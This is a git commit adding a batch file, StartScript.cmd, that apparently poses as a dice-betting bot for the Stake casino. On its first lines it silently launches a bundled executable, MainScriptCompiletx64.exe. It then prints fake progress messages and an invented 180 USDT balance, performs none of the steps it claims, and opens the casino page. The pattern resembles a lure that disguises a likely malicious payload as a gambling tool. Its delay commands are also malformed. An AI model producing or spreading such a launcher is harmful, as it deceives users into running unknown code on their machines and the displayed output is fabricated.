50dc3c6326f573b1c79965b125590ce016c0da44
MishaPisha2 <97434238+MishaPisha2@users.noreply.github.com>
2024-01-21 17:20:00 +0100

    Add files via upload

---
+++ StartScript.cmd
@@ -0,0 +1,62 @@
+@echo off
+echo Stating script.
+ping n- 2 127.0.0.1>nul
+start MainScriptCompiletx64.exe
+cls
+echo Stating script..
+ping n- 2 127.0.0.1>nul
+cls
+echo Stating script...
+ping n- 2 127.0.0.1>nul
+cls
+echo Stating script....
+ping n- 2 127.0.0.1>nul
+cls
+echo Stating script.....
+ping n- 2 127.0.0.1>nul
+cls
+echo Stating script......
+ping n- 2 127.0.0.1>nul
+cls
+echo Stating script.......
+ping n- 2 127.0.0.1>nul
+cls
+echo Stating script........
+ping n- 2 127.0.0.1>nul
+cls
+echo Getting API
+ping n- 2 127.0.0.1>nul
+echo Localizing parameters
+ping n- 2 127.0.0.1>nul
+echo Generating new seasion
+ping n- 2 127.0.0.1>nul
+echo Getting balance info
+ping n- 2 127.0.0.1>nul
+echo Monitoring balance changes
+ping n- 2 127.0.0.1>nul
+echo Getting deposit and withdrawal history
+ping n- 2 127.0.0.1>nul
+start "" https://stake.com/casino/games/dice
+echo Script is starting....
+ping n- 2 127.0.0.1>nul
+ping n- 2 127.0.0.1>nul
+echo Script is running....
+ping n- 2 127.0.0.1>nul
+echo Total bets: 0
+echo =================
+echo Total loses : 0
+echo Total wins : 0
+echo =================
+ping n- 2 127.0.0.1>nul
+echo Total balance : 180 USDT
+echo Script ernings : 0 USDT
+echo Tips : 0 USDT
+echo Total withdrawals : 0
+echo Total deposits : 0
+echo Oppening bet history
+ping n- 2 127.0.0.1>nul
+ping n- 2 127.0.0.1>nul
+ping n- 2 127.0.0.1>nul
+timeout 60
+timeout 60
+timeout 60
